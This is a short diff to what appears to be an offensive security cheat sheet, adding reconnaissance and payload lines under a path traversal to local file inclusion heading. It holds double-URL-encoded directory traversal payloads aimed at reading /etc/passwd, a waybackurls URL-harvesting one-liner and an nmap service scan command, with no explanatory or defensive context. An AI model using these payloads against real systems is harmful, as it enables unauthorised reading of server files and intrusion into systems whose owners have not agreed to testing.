@@ -64,6 +64,10 @@ google dorks :
   Path traversal to LFI 
 
 /%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd
+
+echo http://example.gov | waybackurls | grep /images/
+
+# Double Encode Payload: ".%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd"
   
 ----------------------------------------------------------------------------------------------
 nmap -sV -iL host.txt -oN nmap_scan.txt
